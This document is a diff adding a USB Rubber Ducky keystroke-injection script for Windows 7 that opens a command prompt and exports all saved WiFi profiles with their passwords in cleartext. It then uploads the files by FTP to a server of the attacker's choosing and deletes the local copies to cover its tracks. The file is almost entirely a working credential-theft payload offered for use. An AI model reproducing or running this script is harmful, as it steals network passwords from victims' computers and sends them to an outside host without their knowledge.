@@ -1,0 +1,46 @@
+WiFi Export – Cleartext
+
+Author: Bucky67GTO
+Duckencoder: 1.2
+Target: Windows 7
+Description: This script will export the wifi settings then send to an ftp server of your choice. the cool part is that the security is exported in clear text. After sending the file it will delete the exports from the sending directory.
+
+DELAY 2000
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+ENTER
+DELAY 400
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 400
+STRING cd USERPROFILE
+ENTER
+DELAY 400
+STRING ftp -i FTPSERVER
+ENTER
+DELAY 400
+STRING LOGIN NAME
+ENTER
+DELAY 400
+STRING LOGIN PASSWORD
+ENTER
+DELAY 600
+STRING prompt
+ENTER
+DELAY 400
+STRING prompt
+ENTER
+DELAY 400
+STRING MPUT *.xml
+ENTER
+DELAY 2000
+STRING bye
+ENTER
+DELAY 400
+STRING del *.xml
+ENTER
+DELAY 200
+ALT SPACE
+STRING c
